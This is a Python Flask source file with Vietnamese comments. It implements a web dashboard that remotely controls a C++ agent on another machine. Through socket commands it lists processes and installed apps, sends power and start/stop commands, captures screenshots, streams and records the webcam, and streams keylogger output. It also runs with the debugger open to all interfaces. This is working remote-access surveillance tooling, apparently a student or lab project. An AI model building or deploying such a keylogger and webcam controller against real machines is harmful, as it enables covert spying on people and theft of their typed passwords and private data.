import socket
import struct
import time
import json
import os
import threading
import cv2
import numpy as np
from flask import Flask, render_template, request, jsonify, Response
from datetime import datetime

app = Flask(__name__)

# --- CẤU HÌNH KẾT NỐI ---
VM_IP = "127.0.0.1"

COMMAND_PORT = 8888
DATA_PORT = 8889
LIVESTREAM_PORT = 8890
KEYLOG_PORT = 8891

HEADER_FORMAT = '=HHIIIII'
HEADER_SIZE = 24

# Global persistent socket connections
_cmd_socket = None
_data_socket = None
_socket_lock = threading.Lock()

def get_persistent_sockets():
    """Get or create persistent socket connections"""
    global _cmd_socket, _data_socket
    
    with _socket_lock:
        try:
            # Test if sockets are still alive
            if _cmd_socket:
                _cmd_socket.setblocking(False)
                try:
                    data = _cmd_socket.recv(1, socket.MSG_PEEK)
                    if len(data) == 0:
                        raise Exception("Socket closed")
                except socket.error as e:
                    if e.errno not in [socket.EAGAIN, socket.EWOULDBLOCK]:
                        raise
                _cmd_socket.setblocking(True)
            
            # Create new connections if needed
            if _cmd_socket is None:
                print("[DEBUG] Creating new command socket connection")
                _cmd_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _cmd_socket.connect((VM_IP, COMMAND_PORT))
                print("[DEBUG] Command socket connected")
            
            if _data_socket is None:
                print("[DEBUG] Creating new data socket connection")
                _data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _data_socket.connect((VM_IP, DATA_PORT))
                print("[DEBUG] Data socket connected")
                
        except Exception as e:
            print(f"[ERROR] Socket connection failed: {e}")
            # Close and reset sockets on error
            if _cmd_socket:
                try:
                    _cmd_socket.close()
                except:
                    pass
                _cmd_socket = None
            if _data_socket:
                try:
                    _data_socket.close()
                except:
                    pass
                _data_socket = None
            raise
    
    return _cmd_socket, _data_socket

def send_command_packet(cmd_str):
    """Gửi lệnh ngắn tới Server C++"""
    try:
        cmd_sock, _ = get_persistent_sockets()
        cmd_sock.settimeout(3)
        cmd_sock.sendall(cmd_str.encode())
        try:
            response = cmd_sock.recv(4096).decode('utf-8', errors='ignore')
            return response.strip()
        except socket.timeout:
            return "Command sent (No ACK)"
    except Exception as e:
        print(f"Lỗi gửi lệnh '{cmd_str}': {e}")
        return f"Error: {str(e)}"

def receive_large_data(trigger_cmd):
    """Gửi lệnh và nhận dữ liệu lớn (CSV, Ảnh) từ cổng Data"""
    try:
        cmd_sock, data_sock = get_persistent_sockets()
        
        # B1: Gửi lệnh qua Command socket
        cmd_sock.sendall(trigger_cmd.encode())
        print(f"[DEBUG] Sent command: {trigger_cmd}")
        
        # Chờ server xử lý
        time.sleep(0.3)

        # B2: Sử dụng data socket đã kết nối
        data_sock.settimeout(15)
        print(f"[DEBUG] Using persistent data socket")
        
        # B3: Nhận data
        full_payload = bytearray()
        chunks_received = 0
        
        while True:
            # Đọc Header (24 bytes)
            header_data = b''
            while len(header_data) < HEADER_SIZE:
                packet = data_sock.recv(HEADER_SIZE - len(header_data))
                if not packet:
                    print(f"[ERROR] Connection closed while reading header")
                    break
                header_data += packet
            
            if len(header_data) < HEADER_SIZE:
                if chunks_received == 0:
                    print(f"[ERROR] No data received from server")
                else:
                    print(f"[INFO] Received {chunks_received} chunks, closing")
                break
            
            # Giải mã Header
            try:
                cmd, res = struct.unpack('<HH', header_data[:4])
                total, curr, size, total_size, checksum = struct.unpack('!IIIII', header_data[4:])
                
                print(f"[DEBUG] Header: cmd={cmd}, total={total}, curr={curr}, size={size}, total_size={total_size}")
            except struct.error as e:
                print(f"[ERROR] Failed to unpack header: {e}")
                print(f"[DEBUG] Header bytes: {header_data.hex()}")
                break
            
            # VALIDATION
            MAX_CHUNK_SIZE = 5 * 1024 * 1024
            if size > MAX_CHUNK_SIZE or size <= 0:
                print(f"[ERROR] Invalid chunk size: {size} bytes")
                break
            
            # Đọc dữ liệu Chunk
            print(f"[DEBUG] Reading chunk {curr+1}/{total}, size={size} bytes...")
            chunk_data = b''
            
            while len(chunk_data) < size:
                remaining = size - len(chunk_data)
                to_read = min(8192, remaining)
                
                try:
                    packet = data_sock.recv(to_read)
                    if not packet:
                        print(f"[ERROR] Connection closed after {len(chunk_data)}/{size} bytes")
                        break
                    chunk_data += packet
                        
                except socket.timeout:
                    print(f"[TIMEOUT] Socket timeout after {len(chunk_data)}/{size} bytes")
                    break
            
            if len(chunk_data) != size:
                print(f"[ERROR] Incomplete chunk: expected {size}, got {len(chunk_data)} bytes")
                break
            
            full_payload.extend(chunk_data)
            chunks_received += 1
            print(f"[SUCCESS] Chunk {curr+1}/{total} complete ({len(chunk_data)} bytes)")
            
            if curr >= total - 1:
                print(f"[COMPLETE] All {total} chunks received, total {len(full_payload)} bytes")
                break
        
        # B4: Đọc response từ cmd_sock
        try:
            cmd_sock.settimeout(0.5)
            response = cmd_sock.recv(4096)
            print(f"[DEBUG] Server response: {response.decode('utf-8', errors='ignore').strip()}")
        except socket.timeout:
            print(f"[DEBUG] No response from server")
        
        if len(full_payload) > 0:
            print(f"[FINAL] Returning {len(full_payload)} bytes")
            return full_payload
        else:
            print(f"[FINAL] No payload received")
            return None
        
    except Exception as e:
        print(f"[ERROR] Exception: {e}")
        import traceback
        traceback.print_exc()
        
        # Reset connections on error
        global _cmd_socket, _data_socket
        with _socket_lock:
            if _cmd_socket:
                try:
                    _cmd_socket.close()
                except:
                    pass
                _cmd_socket = None
            if _data_socket:
                try:
                    _data_socket.close()
                except:
                    pass
                _data_socket = None
        return None
    
# --- API ROUTES ---

@app.route('/')
def index():
    return render_template('dashboard.html', ip=VM_IP)

@app.route('/api/ping')
def ping():
    """Kiểm tra kết nối tới Server"""
    res = send_command_packet("PING")
    if "Error" not in res:
        return jsonify({'status': 'online'})
    return jsonify({'status': 'offline'})

@app.route('/api/<type>')
def list_items(type):
    """Lấy danh sách Process hoặc App"""
    cmd = "PROCESS_LIST" if type == 'processes' else "APP_LIST"
    raw_data = receive_large_data(cmd)
    
    if not raw_data: 
        return jsonify([])

    try:
        text = raw_data.decode('utf-8', errors='ignore')
        lines = text.split('\n')
        data = []
        
        for line in lines[1:]:
            parts = line.split(',')
            if type == 'processes' and len(parts) >= 5:
                data.append({
                    'name': parts[0].strip('"'),
                    'pid': parts[1].strip('"'),
                    'mem': parts[4].strip('"')
                })
            elif type == 'apps' and len(parts) >= 4:
                data.append({
                    'name': parts[1].strip('"'),
                    'ver': parts[2].strip('"'),
                    'loc': parts[3].strip('"')
                })
        return jsonify(data)
    except Exception as e:
        print(f"Parse error: {e}")
        return jsonify([])

@app.route('/api/control', methods=['POST'])
def control_action():
    """Xử lý các lệnh Start/Stop/Power"""
    req = request.json
    cmd = req.get('cmd')
    arg = req.get('arg', '')
    
    cmd_str = cmd
    if arg:
        cmd_str = f"{cmd} {arg}"
        
    resp = send_command_packet(cmd_str)
    return jsonify({'response': resp})

@app.route('/api/screenshot')
def screenshot():
    """Chụp màn hình"""
    img_bytes = receive_large_data("SCREEN_CAPTURE")
    if img_bytes:
        # Tạo thư mục lưu ảnh
        os.makedirs('screenshots', exist_ok=True)
        
        # Tạo tên file với timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'screenshots/screenshot_{timestamp}.jpg'
        
        # Lưu file
        with open(filename, 'wb') as f:
            f.write(img_bytes)
        print(f"[SAVED] Screenshot saved to {filename}")
        
        return Response(bytes(img_bytes), mimetype='image/jpeg')
    return "Error capturing screen", 500

# --- WEBCAM STREAMING (MJPEG) ---

def webcam_stream():
    send_command_packet("LIVESTREAM")
    time.sleep(1) 
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((VM_IP, LIVESTREAM_PORT))
        
        while True:
            size_data = sock.recv(4)
            if not size_data: break
            
            size = struct.unpack('i', size_data)[0]
            if size > 10000000: continue
            
            img_data = b''
            while len(img_data) < size:
                packet = sock.recv(size - len(img_data))
                if not packet: break
                img_data += packet
                
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
    except Exception as e:
        print(f"Webcam Error: {e}")

# Global biến để lưu video
_video_writer = None
_is_recording = False

@app.route('/api/webcam/record', methods=['POST'])
def webcam_record():
    """Bắt đầu/dừng ghi video"""
    global _is_recording, _video_writer
    action = request.json.get('action')
    
    if action == 'start':
        _is_recording = True
        print("[RECORDING] Recording enabled")
        return jsonify({'status': 'Recording started - video will be saved to recordings folder'})
    else:
        _is_recording = False
        if _video_writer:
            _video_writer.release()
            _video_writer = None
            print("[RECORDING] Recording stopped and saved")
        return jsonify({'status': 'Recording stopped - video saved successfully'})


def webcam_stream():
    global _video_writer, _is_recording
    
    send_command_packet("LIVESTREAM")
    time.sleep(1)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((VM_IP, LIVESTREAM_PORT))
        
        # Khởi tạo video writer khi bắt đầu record
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs('recordings', exist_ok=True)
        video_path = f'recordings/webcam_{timestamp}.avi'
        
        while True:
            size_data = sock.recv(4)
            if not size_data: break
            
            size = struct.unpack('i', size_data)[0]
            if size > 10000000: continue
            
            img_data = b''
            while len(img_data) < size:
                packet = sock.recv(size - len(img_data))
                if not packet: break
                img_data += packet
            
            # Lưu frame vào video nếu đang record
            if _is_recording and img_data:
                # Decode JPEG thành numpy array
                nparr = np.frombuffer(img_data, np.uint8)
                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                if frame is not None:
                    # Khởi tạo writer lần đầu (cần biết kích thước frame)
                    if _video_writer is None:
                        h, w = frame.shape[:2]
                        _video_writer = cv2.VideoWriter(video_path, fourcc, 20.0, (w, h))
                        print(f"[RECORDING] Started recording to {video_path}")
                    
                    _video_writer.write(frame)
                
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
                   
    except Exception as e:
        print(f"Webcam Error: {e}")
    finally:
        if _video_writer:
            _video_writer.release()
            _video_writer = None

@app.route('/video_feed')
def video_feed():
    return Response(webcam_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/api/webcam/off', methods=['POST'])
def webcam_off():
    global _video_writer, _is_recording
    
    # Dừng recording nếu đang quay
    if _is_recording:
        _is_recording = False
        if _video_writer:
            _video_writer.release()
            _video_writer = None
    
    # Gửi lệnh stop stream về server
    send_command_packet("STOPLIVESTREAM")
    print("[STREAM] Stream stopped by user")
    return jsonify({'status': 'Stream stopped successfully'})

# --- KEYLOGGER STREAMING (SSE) ---
@app.route('/api/keylog/toggle', methods=['POST'])
def keylog_toggle():
    state = request.json.get('state')
    cmd = "KEYLOG" if state else "STOPKEYLOG"
    
    # Chỉ gửi lệnh
    send_command_packet(cmd)
    time.sleep(0.5)
    
    return jsonify({'status': 'ok'})

@app.route('/api/keylog/stream')
def stream_keys():
    def events():
        # Retry kết nối
        max_retries = 10
        sock = None
        
        for retry_count in range(max_retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((VM_IP, KEYLOG_PORT))
                sock.settimeout(None)
                print(f"[KEYLOG] Connected on attempt {retry_count + 1}")
                break
            except Exception as e:
                print(f"[KEYLOG] Attempt {retry_count + 1}/{max_retries} failed: {e}")
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                    sock = None
                
                if retry_count < max_retries - 1:
                    time.sleep(1)
                else:
                    yield "data: [ERROR] Cannot connect after 10 attempts\n\n"
                    return
        
        # Stream data
        try:
            while True:
                data = sock.recv(1024)
                if not data:
                    break
                
                decoded = data.decode(errors='ignore')
                yield f"data: {decoded}\n\n"
                    
        except Exception as e:
            print(f"[KEYLOG ERROR] {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
            yield "data: [DISCONNECTED]\n\n"
    
    return Response(events(), mimetype="text/event-stream")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)